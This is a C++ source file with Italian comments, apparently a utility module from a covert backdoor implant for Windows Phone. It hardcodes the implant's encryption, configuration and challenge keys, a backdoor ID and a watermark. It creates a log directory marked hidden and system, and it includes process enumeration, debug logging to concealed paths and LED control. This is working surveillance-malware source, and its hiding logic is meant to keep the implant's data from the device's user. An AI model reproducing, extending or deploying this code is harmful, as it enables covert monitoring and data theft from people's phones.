#include "Common.h"
#include "Common_new.h"
#include "Status.h"
#include <common_new\nled.h>

#include "FunctionFunc.h"

#pragma message(__LOC__"Rimuovere il PDB")
// Non va modificata dal configuratore! (Anno/Mese/Giorno)
DWORD g_Version = BACKDOOR_VERSION;

#ifdef _DEMO
#pragma message(__LOC__"Demo mode Attivo!")
wstring g_StrDemo;
#endif

/**
* Variabili globali utilizzate dal configuratore
*/

/*
chiavi che alor binaripatcha
log key: WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg
config key: 6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY
proto key: ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ
build id: EMp7Ca7-fpOBIr
demo marker: Pg-WaVyPzMMMMmGbhP6qAigT
water mark: B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW

*/


// Subversion
///BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
BYTE g_Subtype[16] = "WINPHONE\x00\x00\x00\x00\x00\x00\x00";

//#define FORCE_DEMO

#ifdef FORCE_DEMO
BYTE g_DemoMode[] = "12-WaVyPzMMMMmGbhP6qAigT";
#else
// Marker per il demo mode
BYTE g_DemoMode[] = "Pg-WaVyPzMMMMmGbhP6qAigT";
#endif

// Chiave per cifrare i log
BYTE g_AesKey[] = "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg";

// Chiave per decifrare il file di configurazione
BYTE g_ConfKey[] = "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY";

// 20 byte che identificano univocamente il dispositivo su cui runna la backdoor
BYTE g_InstanceId[] = "bg5etG87q20Kg52W5Fg1";

// 14 byte che identificano univocamente la backdoor
BYTE g_BackdoorID[] = "EMp7Ca7-fpOBIr\x00\x00";




// Chiave per il challenge
BYTE g_Challenge[] = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ";

// Nome del file di configurazione CIFRATO con il primo byte di g_Challenge[]
WCHAR g_ConfName[] = L"fmh58t4.wph";

// Watermark
BYTE g_Watermark[] = "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW";

// Il nome della nostra DLL, viene riempito in fase di inizializzazione dalla backdoor
wstring g_strOurName;

// Handle della coda IPC per l'agente degli SMS
// XXXXXXX E' una zozzerigi, andrebbe creata una classe IPC singleton 
// in grado di tener traccia di tutte le code create e di restituire gli handle
HANDLE g_hSmsQueueRead = NULL;
HANDLE g_hSmsQueueWrite = NULL;

// Su Windows Mobile non esiste il concetto di Current_directory, quindi dobbiamo
// fare questo macello per scoprire in che path siamo. Il parametro pInFile e' il
// nome del file al quale vogliamo anteporre il path. La funzione torna una stringa 
// vuota se ci sono stati problemi.
wstring GetCurrentPath(const PWCHAR pInFile) {
	wstring strBackdoorPath;

#ifdef MORNELLA_STATIC
	WCHAR backdoorPath[MAX_PATH + 1] = {0};

	// Non serve se siamo un servizio
	if (!GetModuleFileName(NULL, backdoorPath, MAX_PATH))
		return strBackdoorPath;

	strBackdoorPath = backdoorPath;
	strBackdoorPath.resize(strBackdoorPath.rfind(L"\\"));
#else
	/////strBackdoorPath = L"\\windows";
	///BYGIO strBackdoorPath = L".\\";
	strBackdoorPath = L"";
#endif

	strBackdoorPath += LOG_DIR;

	// Fallisce se gia' esiste.
	CreateDirectory((PWCHAR)strBackdoorPath.c_str(), NULL);
	
	SetFileAttributes((PWCHAR)strBackdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	if (pInFile)
		strBackdoorPath += pInFile;

	return strBackdoorPath;
}

// Uguale alla GetCurrentPath() ma prende come argomento una wstring
wstring GetCurrentPathStr(const wstring &strInFile) {
	return GetCurrentPath((const PWCHAR)strInFile.c_str());
}

// Il parametro pInFile e' il nome del file al quale vogliamo anteporre il path. 
// La funzione torna NULL se la MMC non e' stato trovata, un puntatore alla stringa 
// altrimenti. La stringa va liberata dal chiamante!
wstring GetFirstMMCPath(const PWCHAR pInFile) {
/***
	WIN32_FIND_DATA wfd;
	HANDLE hMmc = INVALID_HANDLE_VALUE;
	wstring strBackdoorPath;

	ZeroMemory(&wfd, sizeof(wfd));

	hMmc = __FindFirstFlashCard(&wfd);

	if (hMmc == INVALID_HANDLE_VALUE)
		return strBackdoorPath;

	if (wcslen(wfd.cFileName) == 0 && FindNextFlashCard(hMmc, &wfd) == FALSE) {
		FindClose(hMmc);
		return strBackdoorPath;
	}

	FindClose(hMmc);

	strBackdoorPath = L"\\";
	strBackdoorPath += wfd.cFileName;
	strBackdoorPath += LOG_DIR;

	// Fallisce se gia' esiste.
	CreateDirectory(strBackdoorPath.c_str(), NULL);

	SetFileAttributes(strBackdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	if (pInFile)
		strBackdoorPath += pInFile;

	return strBackdoorPath;
***/
	//return L".\\"; //ByGIO
	return L""; //ByGIO
}

// Come la precedente ma torna il path della seconda MMC se presente, NULL
// altrimenti (la root non viene conteggiata come MMC).
wstring GetSecondMMCPath(const PWCHAR pInFile) {
/***
	WIN32_FIND_DATA wfd;
	HANDLE hMmc = INVALID_HANDLE_VALUE;
	wstring strBackdoorPath;

	ZeroMemory(&wfd, sizeof(wfd));

	hMmc = FindFirstFlashCard(&wfd);

	if (hMmc == INVALID_HANDLE_VALUE)
		return strBackdoorPath;

	if (FindNextFlashCard(hMmc, &wfd) == FALSE) {
		FindClose(hMmc);
		return strBackdoorPath;
	}

	if (wcslen(wfd.cFileName) == 0 && FindNextFlashCard(hMmc, &wfd) == FALSE) {
		FindClose(hMmc);
		return strBackdoorPath;
	}

	FindClose(hMmc);

	strBackdoorPath = L"\\";
	strBackdoorPath += wfd.cFileName;
	strBackdoorPath += LOG_DIR;

	// XXX - Non creiamo la directory LOG_DIR nella seconda MMC perche' per il momento non storiamo nulla li'.
	// XXX - In futuro potremmo usare la FindFirstProjectFile()/EnumProjectsFilesEx() per cercare in automatico 
	// XXX - tutte le MMC.
	// Fallisce se gia' esiste.
	CreateDirectory(strBackdoorPath.c_str(), NULL);

	SetFileAttributes(strBackdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	if (pInFile)
		strBackdoorPath += pInFile;

	return strBackdoorPath;
***/
	//return L".\\"; //ByGIO
	return L""; //ByGIO
}

// Torna l'HANDLE (e quindi anche l'ID) di un processo, l'HANDLE
// va poi chiuso tramite la CloseHandle()
HANDLE GetProcessHandle(const PWCHAR wProcessName) {
	HANDLE hTH = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (hTH == INVALID_HANDLE_VALUE)
		return NULL;

	HANDLE hProc = INVALID_HANDLE_VALUE;

	if (_Process32FirstW(hTH, &pe)) {
		do {
			if (_wcsicmp(wProcessName, pe.szExeFile) == 0) {
				hProc = _OpenProcess(0, 0, pe.th32ProcessID);

				if (hProc != INVALID_HANDLE_VALUE && hProc!=NULL)
					break;
			}
		} while (_Process32NextW(hTH, &pe));
	}

	_CloseToolhelp32Snapshot(hTH);
	return hProc;
}

// Imposta strProcName con il nome di un processo a partire dall'ID (o HANDLE). 
// Torna TRUE se la funzione va a buon fine, FALSE altrimenti.
BOOL GetProcessName(DWORD dwId, wstring &strProcName) {
	HANDLE hTH = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	BOOL bFound = FALSE;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (hTH == INVALID_HANDLE_VALUE)
		return FALSE;

	HANDLE hProc = INVALID_HANDLE_VALUE;

	if (_Process32FirstW(hTH, &pe)) {
		do {
			if (pe.th32ProcessID == dwId) {
				strProcName = pe.szExeFile;
				bFound = TRUE;
				break;
			}
		} while (_Process32NextW(hTH, &pe));
	}

	_CloseToolhelp32Snapshot(hTH);
	return bFound;
}

// Torna la lunghezza in BYTE di una stringa WCHAR (ESCLUSO IL NULL-terminator!!!)
UINT WideLen(const PWCHAR p) {
	if (p == NULL)
		return 0;

	return (wcslen(p) * sizeof(WCHAR));
}

// Torna il system time in un ULARGE_INTEGER
unsigned __int64 GetTime() {
	SYSTEMTIME st;
	FILETIME ft;
	ULARGE_INTEGER uLarge;

	ZeroMemory(&st, sizeof(st));
	ZeroMemory(&ft, sizeof(ft));

	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &ft);

	uLarge.HighPart = ft.dwHighDateTime;
	uLarge.LowPart = ft.dwLowDateTime;

	return uLarge.QuadPart;
}

// Torna la differenza di tempo in ms
unsigned __int64 DiffTime(unsigned __int64 new_time, unsigned __int64 old_time) {
	// Il tempo e' in 100-ns, 1ms sono 1000000ns e quindi
	// 1ms equivale a 10000 100-ns, percio' dividiamo per 10000
	// in modo da avere la differenza temporale in ms.
	return (new_time - old_time) / 10000;
}

// Torna la quantita' di memoria fisica in uso
UINT GetUsedPhysMemory() {
	MEMORYSTATUS mex;

	ZeroMemory(&mex, sizeof(MEMORYSTATUS));
	mex.dwLength = sizeof (MEMORYSTATUS);

	_GlobalMemoryStatus(&mex);

	return (UINT)(mex.dwTotalPhys - mex.dwAvailPhys);
}

// Torna l'hash di una stringa
UINT FnvHash(BYTE *pBuf, UINT uLen) {
	BYTE *bp = pBuf;
	BYTE *be = bp + uLen;
	UINT FnvHashVal = FNV1_32_PRIME;

	// Calcola l'hash di tutti i byte nel buffer
	while (bp < be) {
		// Xora i byte del buffer con FnvHashVal
		FnvHashVal ^= (UINT)*bp++;

		// Moltiplica il valore con il magic prime FNV mod 2^32
		FnvHashVal *= FNV1_32_PRIME;
	}

	// Torna l'hash
	return FnvHashVal;
}

void AddDemoMessage(const PWCHAR pwMessage) {
#ifdef _DEMO
	g_StrDemo += pwMessage;
#endif
}

void DisplayDemoMessage(const PWCHAR pwMessage) {
#ifdef _DEMO
#pragma message(__LOC__"Riabilitami!!!")
	if (pwMessage == NULL) {
		//MessageBox(NULL, pwMessage, L"Backdoor Status", MB_OK | MB_TOPMOST);
		g_StrDemo.clear();
	} else {
		//MessageBox(NULL, strMessage.c_str(), L"Backdoor Status", MB_OK | MB_TOPMOST);
	}
#endif
}

///#ifdef _DEBUG
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
///#endif

#include <iostream>
#include <fstream>
#include <time.h>
using namespace std;


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21
static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}


void DebugTrace(const PWCHAR pwMsg, UINT uPriority, BOOL bLastError) {

#ifdef _DEBUG	
					fstream filestr;
					wchar_t msgW[128];
					char msgA[128];
					swprintf_s(msgW,L"%s", pwMsg);
					wcstombs(msgA, msgW, wcslen(msgW)+1);


					char buff[DTTMSZ];
					filestr.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\DebugTrace.txt", fstream::out|fstream::app);
					filestr << getDtTm (buff) << std::endl;
					filestr << msgA << std::endl;
					filestr << std::endl;
					filestr.close();


#pragma message(__LOC__"DebugTrace attivo!")
	DWORD dwLastErr, dwWsaLastErr;
	SYSTEMTIME systemTime;

	dwLastErr = GetLastError();
	dwWsaLastErr = WSAGetLastError();

	GetSystemTime(&systemTime);

#ifdef LOG_TO_DEBUGGER
	wstring strMsg;
	WCHAR wTime[200];

	// Versione log nel debugger
	if (uPriority > DBG_ALERT || pwMsg == NULL)
		return;

	swprintf_s(wTime, L"Day: %02d - %02d:%02d:%02d:%04d - ", systemTime.wDay, systemTime.wHour, systemTime.wMinute, 
		systemTime.wSecond, systemTime.wMilliseconds);

	strMsg = wTime;
	strMsg += pwMsg;

	if (bLastError) {
		swprintf_s(wTime, L"GetLastError(): 0x%08x (WSAGetLastError(): 0x%08x)\n", dwLastErr, dwWsaLastErr);
		strMsg += wTime;
	}

	strMsg += L"\n";

	wprintf(strMsg.c_str());
	OutputDebugString(strMsg.c_str());
#else
	string strMsg;
	char buffer[600];
	DWORD dwWritten;

	// Versione per il log su File
	if (uPriority > DBG_ALERT || pwMsg == NULL)
		return;

	HANDLE hFile = CreateFile(L"\\BDRunLog.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG_ERROR_VAL(GetLastError(), L"CreateFile()");
		return;
	}

	SetFilePointer(hFile, 0, NULL, FILE_END);

	sprintf(buffer, "Day: %02d - %02d:%02d:%02d:%04d - %S", systemTime.wDay, systemTime.wHour, systemTime.wMinute, 
		systemTime.wSecond, systemTime.wMilliseconds, pwMsg);

	strMsg = buffer;

	if (bLastError) {
		sprintf(buffer, "GetLastError(): 0x%08x (WSAGetLastError(): 0x%08x) ", dwLastErr, dwWsaLastErr);
		strMsg += buffer;
	}

	strMsg += "\r\n";

	if (WriteFile(hFile, (void *)strMsg.c_str(), strMsg.size(), &dwWritten, NULL) == FALSE) {
		DBG_ERROR_VAL(GetLastError(), L"WriteFile()");
	}

	CloseHandle(hFile);
#endif // LOG_TO_DEBUGGER
	return;
#endif // _DEBUG
}

void DebugTraceInt(const PWCHAR pwMsg, UINT uPriority, BOOL bLastError, INT iVal) {
#ifdef _DEBUG
	#pragma message(__LOC__"DebugTraceInt attivo!")
	wstringstream out;
	wstring strMsg = pwMsg;

	out << std::hex;
	out << iVal;

	strMsg += L"[iVal: 0x";
	strMsg += out.str();

	if (bLastError)
		strMsg += L"] ";
	else
#ifdef LOG_TO_DEBUGGER
		strMsg += L"]\n";
#else
		strMsg += L"]\r\n";
#endif

	DebugTrace((PWCHAR)strMsg.c_str(), uPriority, bLastError);
#endif
}

void DebugTraceVersion() {
#ifdef _DEBUG
	WCHAR wVersion[100];
	OSVERSIONINFO ovi;

	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	swprintf_s(wVersion, L"WinPhone8 Core Version: %d\n", g_Version);
	DBG_TRACE(wVersion, 1, FALSE);

	if (_GetVersionExW(&ovi) == FALSE)
		return;

	swprintf_s(wVersion, L"Windows Version: %d.%d build %d (Platform: %d)\n",
		ovi.dwMajorVersion, ovi.dwMinorVersion, ovi.dwBuildNumber, ovi.dwPlatformId);

	DBG_TRACE(wVersion, 1, FALSE);
#endif
}

int GetLedCount() {
/***
	NLED_COUNT_INFO nci;
	int wCount = 0;

	if (NLedGetDeviceInfo(NLED_COUNT_INFO_ID, (PVOID) &nci))
		wCount = (int) nci.cLeds;

	return wCount;
***/
	return 0;
}

// 0 - Led Off
// 1 - Led On
// 2 - Led Blink
void SetLedStatus(int wLed, int wStatus) {
/***
	NLED_SETTINGS_INFO nsi;

	nsi.LedNum = (INT) wLed;
	nsi.OffOnBlink = (INT) wStatus;

	NLedSetDevice(NLED_SETTINGS_INFO_ID, &nsi);
***/
}

void BlinkLeds() {
	int i;

	for (i = 0; i < GetLedCount(); i++)
		SetLedStatus(i, 2);

	_Sleep(250);

	TurnOffLeds();
}

void TurnOffLeds() {
	int i;

	for (i = 0; i < GetLedCount(); i++)
		SetLedStatus(i, 0);
}